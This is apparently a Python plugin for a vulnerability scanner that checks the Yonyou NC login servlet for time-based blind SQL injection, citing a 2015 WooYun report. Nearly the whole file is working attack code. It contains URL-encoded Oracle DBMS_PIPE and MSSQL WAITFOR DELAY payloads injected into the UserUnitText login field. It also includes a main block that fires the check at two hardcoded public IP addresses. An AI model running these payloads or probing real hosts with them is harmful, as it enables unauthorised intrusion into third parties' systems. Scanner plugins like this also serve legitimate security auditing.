#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0138680

import time

def assign(service, arg):
    if service == "yongyou_nc":
        return True, arg
        
        
def audit(arg):
    url = arg + 'nc/servlet/nc.ui.iufo.login.LoginUI'
    postdatas ={                                            
    'LoginButton=%e7%99%bb%e5%bd%95(Login)&currentDate=2015-09-02&dschoice=aorwpw5ufcw6&hidBack=&languagechoice=simpchn&operType=null&refrence=%e5%8f%82%e7%85%a7(Ref)&timeRef=%e5%8f%82%e7%85%a7(Ref)&UserCodeText=wxbsisqq&UserPassText=wxbsisqq&UserSeleLang=simpchn&UserUnitText=asd%27%29%20AND%208148%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2872%29%7C%7CCHR%2867%29%7C%7CCHR%2885%29%7C%7CCHR%2876%29%2C5%29%20AND%20%28%271%27%3D%271':'LoginButton=%e7%99%bb%e5%bd%95(Login)&currentDate=2015-09-02&dschoice=aorwpw5ufcw6&hidBack=&languagechoice=simpchn&operType=null&refrence=%e5%8f%82%e7%85%a7(Ref)&timeRef=%e5%8f%82%e7%85%a7(Ref)&UserCodeText=wxbsisqq&UserPassText=wxbsisqq&UserSeleLang=simpchn&UserUnitText=asd%27%29%20AND%208148%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2872%29%7C%7CCHR%2867%29%7C%7CCHR%2885%29%7C%7CCHR%2876%29%2C1%29%20AND%20%28%271%27%3D%271',
    'LoginButton=%e7%99%bb%e5%bd%95(Login)&currentDate=2015-09-02&dschoice=aorwpw5ufcw6&hidBack=&languagechoice=simpchn&operType=null&refrence=%e5%8f%82%e7%85%a7(Ref)&timeRef=%e5%8f%82%e7%85%a7(Ref)&UserCodeText=wxbsisqq&UserPassText=wxbsisqq&UserSeleLang=simpchn&UserUnitText=asd%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--':'LoginButton=%e7%99%bb%e5%bd%95(Login)&currentDate=2015-09-02&dschoice=aorwpw5ufcw6&hidBack=&languagechoice=simpchn&operType=null&refrence=%e5%8f%82%e7%85%a7(Ref)&timeRef=%e5%8f%82%e7%85%a7(Ref)&UserCodeText=wxbsisqq&UserPassText=wxbsisqq&UserSeleLang=simpchn&UserUnitText=asd%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A1%27--'
    }
    for postdata in postdatas: 
        t1 = time.time()
        code1, head, res1, errcode, _ = curl.curl2(url,postdata)
        t2 = time.time()
        code2, head, res2, errcode, _ = curl.curl2(url,postdatas[postdata])
        t3 = time.time()
        if code1==200 and code2 == 200 and (2*t2 - t1 - t3 > 3):
            security_hole(url + "   :post Injection")


if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_nc', 'http://61.135.227.114/')[1])
    audit(assign('yongyou_nc', 'http://101.95.113.130/')[1])